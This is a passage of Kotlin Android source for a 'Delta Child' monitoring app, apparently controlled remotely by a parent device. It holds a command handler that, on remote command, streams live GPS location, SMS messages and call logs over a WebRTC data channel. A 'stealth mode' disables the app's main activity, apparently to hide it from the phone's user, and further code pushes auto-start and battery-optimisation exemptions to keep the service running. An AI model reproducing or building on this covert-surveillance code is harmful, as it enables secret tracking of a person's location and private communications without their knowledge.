                            sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
                        }
                    } else {
                        requestPermissionWithFallback(Manifest.permission.ACCESS_FINE_LOCATION, 1004, "Location")
                        sendDataChannelMessage("LOCATION_PERMISSION_REQUESTED")
                    }
                }

                "LOCATE_CHILD_STOP" -> {
                    try {
                        stopLocationTracking()
                        sendDataChannelMessage("LOCATION_STOPPED")
                        Log.d("Command", "Location tracking stopped successfully")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop location tracking", e)
                        sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
                    }
                }

                "PING_CHILD" -> {
                    sendDataChannelMessage("PONG_CHILD")
                    Log.d("Command", "Ping received and pong sent")
                }

                "PONG_PARENT" -> {
                    Log.d("Command", "Pong received from parent - connection is healthy")
                }

                "OPEN_SETTINGS" -> {
                    openAppSettings()
                    sendDataChannelMessage("SETTINGS_OPENED")
                    Log.d("Command", "Opening app settings")
                }

                "CHECK_PERMISSIONS" -> {
                    checkPermissionStatus()
                    Log.d("Command", "Checking permission status")
                }

                "REQUEST_ALL_PERMISSIONS" -> {
                    requestAllPermissions()
                    sendDataChannelMessage("ALL_PERMISSIONS_REQUESTED")
                    Log.d("Command", "Requesting all permissions again")
                }

                "SHOW_PERMISSION_DIALOG" -> {
                    val featureName = cmd.split(":")[1].ifEmpty { "Unknown" }
                    showPermissionSettingsDialog(featureName)
                    sendDataChannelMessage("PERMISSION_DIALOG_SHOWN")
                    Log.d("Command", "Showing permission dialog for: $featureName")
                }

                //SMS Commands
                "SMS_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            initializeSmsSharing()
                            smsSharing?.startSharing()
                            sendDataChannelMessage("SMS_STARTED")
                            Log.d("Command", "SMS sharing started (since=$since)")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start SMS sharing", e)
                            sendDataChannelMessage("SMS_ERROR: ${e.message}")
                        }
                    } else {
                        requestPermissionWithFallback(Manifest.permission.READ_SMS, 1005, "SMS")
                        sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                        Log.d("Command", "Requested READ_SMS permission")
                    }
                }
                "SMS_OFF" -> {
                    if (smsSharing == null) {
                        Log.w("Command", "Tried to stop SMS sharing but it was never started.")
                    }
                    try {
                        smsSharing?.stopSharing()
                        sendDataChannelMessage("SMS_STOPPED")
                        Log.d("Command", "SMS sharing stopped")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop SMS sharing", e)
                        sendDataChannelMessage("SMS_ERROR: ${e.message}")
                    }
                }

                // Call Log Commands
                "CALLLOG_ON" -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        try {
                            initializeCallLogSharing()
                            callLogSharing?.startSharing()
                            sendDataChannelMessage("CALLLOG_STARTED")
                            Log.d("Command", "Call log sharing started (since=$since)")
                        } catch (e: Exception) {
                            Log.e("Command", "Failed to start call log sharing", e)
                            sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
                        }
                    } else {
                        requestPermissionWithFallback(Manifest.permission.READ_CALL_LOG, 1006, "Call Log")
                        sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                        Log.d("Command", "Requested READ_CALL_LOG permission")
                    }
                }
                "CALLLOG_OFF" -> {
                    if (callLogSharing == null) {
                        Log.w("Command", "Tried to stop call log sharing but it was never started.")
                    }
                    try {
                        callLogSharing?.stopSharing()
                        sendDataChannelMessage("CALLLOG_STOPPED")
                        Log.d("Command", "Call log sharing stopped")
                    } catch (e: Exception) {
                        Log.e("Command", "Failed to stop call log sharing", e)
                        sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
                    }
                }

                // Stealth Commands
                "STEALTH_ON" -> {
                    activateStealthMode()
                    stealthActivated.value = true // <-- fix here
                    sendDataChannelMessage("STEALTH_ON_ACK")
                    Log.d("Command", "Stealth mode activated")
                }
                "STEALTH_OFF" -> {
                    deactivateStealthMode()
                    stealthActivated.value = false // <-- fix here
                    sendDataChannelMessage("STEALTH_OFF_ACK")
                    Log.d("Command", "Stealth mode deactivated")
                }
                else -> {
                    Log.w("Command", "Unknown command: $cmd")
                    sendDataChannelMessage("UNKNOWN_COMMAND: $cmd")
                }
            }
        } catch (e: Exception) {
            Log.e("Command", "Unexpected error handling command: $cmd", e)
            sendDataChannelMessage("COMMAND_ERROR: ${e.message}")
        }

    }

    /* ─── small helpers ───────────────────────────────────────────────────────────────────────── */
    private fun sendDataChannelMessage(message: String) {
        try {
            if (dataChannel?.state() == DataChannel.State.OPEN) {
                val buffer = DataChannel.Buffer(
                    java.nio.ByteBuffer.wrap(message.toByteArray(Charsets.UTF_8)),
                    false
                )
                dataChannel?.send(buffer)
                Log.d("DataChannel", "Sent message: $message")
            } else {
                Log.w("DataChannel", "Cannot send message, channel state: ${dataChannel?.state()}")
            }
        } catch (e: Exception) {
            Log.e("DataChannel", "Failed to send message: $message", e)
        }
    }
    private fun initializeSmsSharing() {
        if (smsSharing == null && dataChannel != null) {
            smsSharing = SmsSharing(this, dataChannel!!)
            Log.d("SMS", "SmsSharing initialized")
        }
    }
    private fun initializeCallLogSharing() {
        if (callLogSharing == null && dataChannel != null) {
            callLogSharing = CallLogSharing(this, dataChannel!!)
            Log.d("CALLLOG", "CallLogSharing initialized")
        }
    }
    private fun logSdp(tag: String) = object : SdpObserver {

        override fun onCreateSuccess(s: SessionDescription?) { Log.d(tag, "create OK") }
        override fun onSetSuccess()                         { Log.d(tag, "set OK")    }
        override fun onCreateFailure(m: String?)            { Log.e(tag, "create $m") }
        override fun onSetFailure(m: String?)               { Log.e(tag, "set $m")    }
    }


    /* Runtime‑permission callback (legacy API) ----------------------------- */
    @Deprecated("This method has been deprecated in favor of using the Activity Result API\n      which brings increased type safety via an {@link ActivityResultContract} and the prebuilt\n      contracts for common intents available in\n      {@link androidx.activity.result.contract.ActivityResultContracts}, provides hooks for\n      testing, and allow receiving results in separate, testable classes independent from your\n      activity. Use\n      {@link #registerForActivityResult(ActivityResultContract, ActivityResultCallback)} passing\n      in a {@link RequestMultiplePermissions} object for the {@link ActivityResultContract} and\n      handling the result in the {@link ActivityResultCallback#onActivityResult(Object) callback}.")
    @Suppress("DEPRECATION")      // still simplest for a demo‑app
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            9999 -> { // Startup permission request
                Log.d("Permission", "Startup permission request completed")
                for (i in permissions.indices) {
                    val permission = permissions[i]
                    val granted = grantResults[i] == PackageManager.PERMISSION_GRANTED
                    Log.d("Permission", "Permission $permission: ${if (granted) "GRANTED" else "DENIED"}")
                }
                // Don't start any features here - this is just to get permissions in advance
            }
            1001 -> { // Camera permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    cameraCtrl?.startCamera()
                } else {
                    Log.w("Permission", "Camera permission denied")
                }
            }
            1002 -> { // Microphone permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    micCtrl?.startMicrophone()
                } else {
                    Log.w("Permission", "Microphone permission denied")
                }
            }
            1003 -> { // Notification permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("Permission", "Notification permission granted, proceeding with screen capture")
                    if (screenStreamer != null) {
                        screenStreamer?.requestPermission(this)
                    }
                } else {
                    Log.w("Permission", "Notification permission denied")
                    sendDataChannelMessage("SCREEN_PERMISSION_ERROR")
                }
            }
            1004 -> { // Location permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("Permission", "Location permission granted, starting location tracking")
                    startLocationTracking()
                } else {
                    Log.w("Permission", "Location permission denied")
                    sendDataChannelMessage("LOCATION_PERMISSION_DENIED")
                }
            }
            1005 -> { // SMS permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    try {
                        initializeSmsSharing()
                        smsSharing?.startSharing()
                        sendDataChannelMessage("SMS_STARTED")
                        Log.d("Permission", "READ_SMS permission granted, started SMS sharing")
                    } catch (e: Exception) {
                        Log.e("Permission", "Failed to start SMS sharing after permission", e)
                        sendDataChannelMessage("SMS_ERROR: ${e.message}")
                    }
                } else {
                    Log.w("Permission", "READ_SMS permission denied")
                    sendDataChannelMessage("SMS_PERMISSION_DENIED")
                }
            }
            1006 -> { // Call log permission
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    try {
                        initializeCallLogSharing()
                        callLogSharing?.startSharing()
                        sendDataChannelMessage("CALLLOG_STARTED")
                        Log.d("Permission", "READ_CALL_LOG permission granted, started call log sharing")
                    } catch (e: Exception) {
                        Log.e("Permission", "Failed to start call log sharing after permission", e)
                        sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
                    }
                } else {
                    Log.w("Permission", "READ_CALL_LOG permission denied")
                    sendDataChannelMessage("CALLLOG_PERMISSION_DENIED")
                }
            }
        }
    }

    /* ─── Location tracking methods ─────────────────────────────────────────── */
    private fun setupLocationRequest() {
        locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000) // 5 seconds
            .setMinUpdateIntervalMillis(2000) // 2 seconds minimum
            .setMaxUpdateAgeMillis(10000) // 10 seconds max age
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    sendLocationUpdate(location)
                }
            }
        }
    }

    private fun startLocationTracking() {
        if (isLocationTracking) {
            Log.d("Location", "Location tracking already active")
            return
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w("Location", "Location permission not granted")
            sendDataChannelMessage("LOCATION_PERMISSION_DENIED")
            return
        }

        try {
            locationRequest?.let { request ->
                locationCallback?.let { callback ->
                    fusedLocationClient.requestLocationUpdates(
                        request,
                        callback,
                        Looper.getMainLooper()
                    )
                    isLocationTracking = true
                    sendDataChannelMessage("LOCATION_STARTED")
                    Log.d("Location", "Location tracking started")
                }
            }
        } catch (e: SecurityException) {
            Log.e("Location", "Security exception starting location tracking", e)
            sendDataChannelMessage("LOCATION_PERMISSION_DENIED")
        } catch (e: Exception) {
            Log.e("Location", "Error starting location tracking", e)
            sendDataChannelMessage("LOCATION_ERROR")
        }
    }

    private fun stopLocationTracking() {
        if (!isLocationTracking) {
            Log.d("Location", "Location tracking not active")
            return
        }

        try {
            locationCallback?.let { callback ->
                fusedLocationClient.removeLocationUpdates(callback)
                isLocationTracking = false
                sendDataChannelMessage("LOCATION_STOPPED")
                Log.d("Location", "Location tracking stopped")
            }
        } catch (e: Exception) {
            Log.e("Location", "Error stopping location tracking", e)
        }
    }

    private fun sendLocationUpdate(location: Location) {
        try {
            val locationData = mapOf(
                "type" to "LOCATION_UPDATE",
                "coords" to listOf(location.latitude, location.longitude),
                "accuracy" to location.accuracy,
                "timestamp" to System.currentTimeMillis()
            )

            // Convert to JSON string
            val gson = Gson()
            val jsonString = gson.toJson(locationData)

            sendDataChannelMessage(jsonString)
            Log.d("Location", "Location update sent: ${location.latitude}, ${location.longitude}")
        } catch (e: Exception) {
            Log.e("Location", "Error sending location update", e)
        }
    }

    /* ─── WebRTC renegotiation ─────────────────────────────────────────────── */
    private fun performWebRTCRenegotiation() {
        try {
            Log.d("Renegotiation", "Starting WebRTC renegotiation...")

            peerMgr?.getPeerConnection()?.createOffer(object : SdpObserver by logSdp("RenegotiationOffer") {
                override fun onCreateSuccess(offer: SessionDescription) {
                    Log.d("Renegotiation", "New offer created, setting local description")
                    peerMgr!!.setLocalDescription(offer, logSdp("RenegotiationLocalOffer"))

                    // Send the new offer to the parent
                    Log.d("Renegotiation", "Sending renegotiation offer to parent")
                    signaling?.sendOffer(offer)
                }
            }, MediaConstraints())
        } catch (e: Exception) {
            Log.e("Renegotiation", "Failed to perform renegotiation", e)
            sendDataChannelMessage("SCREEN_CAPTURE_ERROR")
        }
    }

    override fun onPause() {
        super.onPause()
        Log.d("MainActivity", "Activity paused - background service will continue running")
    }

    override fun onResume() {
        super.onResume()
        Log.d("MainActivity", "Activity resumed")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("MainActivity", "Activity destroyed - background service will continue running")
        // Don't cleanup resources here as background service will handle them
    }

    /* ─── Battery Optimization ───────────────────────────────────────────── */
    private fun checkBatteryOptimization() {
        if (!BatteryOptimizationHelper.isIgnoringBatteryOptimizations(this)) {
            Log.d("MainActivity", "Battery optimization not disabled - requesting permission")
            BatteryOptimizationHelper.requestDisableBatteryOptimization(this)
        } else {
            Log.d("MainActivity", "Battery optimization already disabled")
        }
        
        // Ensure service stays alive with retry mechanism
        startBackgroundServiceReliably()
    }

    private fun checkAutoStartPermission() {
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            
            when {
                manufacturer.contains("xiaomi") -> {
                    showAutoStartDialog("Xiaomi", "Settings > Apps > Manage apps > Permissions > Autostart")
                }
                manufacturer.contains("huawei") -> {
                    showAutoStartDialog("Huawei", "Settings > Apps > Apps > ${getString(R.string.app_name)} > Launch")
                }
                manufacturer.contains("oppo") -> {
                    showAutoStartDialog("Oppo", "Settings > App Management > Autostart")
                }
                manufacturer.contains("realme") -> {
                    showAutoStartDialog("Realme", "Settings > Apps > Autostart")
                }
                manufacturer.contains("vivo") -> {
                    showAutoStartDialog("Vivo", "Settings > More settings > Applications > Autostart")
                }
                manufacturer.contains("samsung") -> {
                    showAutoStartDialog("Samsung", "Settings > Apps > Delta Child > Battery > Allow background activity")
                }
                manufacturer.contains("motorola") || manufacturer.contains("lenovo") -> {
                    showAutoStartDialog("Motorola", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                manufacturer.contains("oneplus") -> {
                    showAutoStartDialog("OnePlus", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                manufacturer.contains("google") -> {
                    showAutoStartDialog("Google Pixel", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                manufacturer.contains("nokia") -> {
                    showAutoStartDialog("Nokia", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                manufacturer.contains("asus") -> {
                    showAutoStartDialog("Asus", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                manufacturer.contains("lg") -> {
                    showAutoStartDialog("LG", "Settings > Apps > Delta Child > Battery > Battery optimization")
                }
                else -> {
                    // For other manufacturers, try to open general settings
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = "package:$packageName".toUri()
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Log.e("AutoStart", "Cannot open app settings", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("AutoStart", "Error checking auto-start permission", e)
        }
    }

    private fun showAutoStartDialog(manufacturer: String, path: String) {
        runOnUiThread {
            androidx.appcompat.app.AlertDialog.Builder(this)
                .setTitle("Auto-start Permission Required")
                .setMessage("To ensure the app starts automatically after reboot on your $manufacturer device, please enable auto-start permission:\n\n$path\n\nThis allows the app to run in background after device restart.\n\nAnd also, don't forget to grant location permission as 'allow all the time'.\n\nGo to settings → Privacy → Location → Child → Click 'allow all time'.")
                .setPositiveButton("Open Settings") { _, _ ->
                    openAutoStartSettings()
                }
                .setNegativeButton("Later") { dialog, _ ->
                    dialog.dismiss()
                }
                .setCancelable(false)
                .show()
        }
    }

    private fun openAutoStartSettings() {
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            val intent = when {
                manufacturer.contains("xiaomi") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.miui.securitycenter",
                            "com.miui.permcenter.autostart.AutoStartManagementActivity"
                        )
                    }
                }
                manufacturer.contains("huawei") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.huawei.systemmanager",
                            "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                        )
                    }
                }
                manufacturer.contains("oppo") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.coloros.safecenter",
                            "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                        )
                    }
                }
                manufacturer.contains("realme") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.realme.securitycheck",
                            "com.realme.securitycheck.startupmanager.StartupAppListActivity"
                        )
                    }
                }
                manufacturer.contains("vivo") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.vivo.permissionmanager",
                            "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                        )
                    }
                }
                manufacturer.contains("samsung") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.samsung.android.lool",
                            "com.samsung.android.sm.battery.ui.BatteryActivity"
                        )
                    }
                }
                manufacturer.contains("motorola") || manufacturer.contains("lenovo") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.motorola.optimize",
                            "com.motorola.optimize.BatteryOptimizationActivity"
                        )
                    }
                }
                manufacturer.contains("asus") -> {
                    Intent().apply {
                        component = ComponentName(
                            "com.asus.mobilemanager",
                            "com.asus.mobilemanager.powersaver.PowerSaverSettings"
                        )
                    }
                }
                else -> {
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = "package:$packageName".toUri()
                    }
                }
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("AutoStart", "Cannot open auto-start settings, falling back to app settings", e)
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = "package:$packageName".toUri()
                }
                startActivity(intent)
            } catch (e2: Exception) {
                Log.e("AutoStart", "Cannot open app settings", e2)
            }
        }
    }
    
    private fun startBackgroundServiceReliably() {
        var attempts = 0
        val maxAttempts = 3
        
        fun tryStart() {
            try {
                BackgroundService.startService(this)
                Log.d("MainActivity", "BackgroundService started reliably")
            } catch (e: Exception) {
                attempts++
                Log.e("MainActivity", "Failed to start BackgroundService (attempt $attempts)", e)
                if (attempts < maxAttempts) {
                    android.os.Handler(Looper.getMainLooper()).postDelayed({
                        tryStart()
                    }, 1000 * attempts.toLong())
                }
            }
        }
        
        tryStart()
    }

    private fun activateStealthMode() {
        try {
            val pm = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("StealthMode", "Failed to activate stealth mode", e)
        }
    }

    private fun deactivateStealthMode() {
        try {
            val pm = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("StealthMode", "Failed to deactivate stealth mode", e)
        }
    }
}
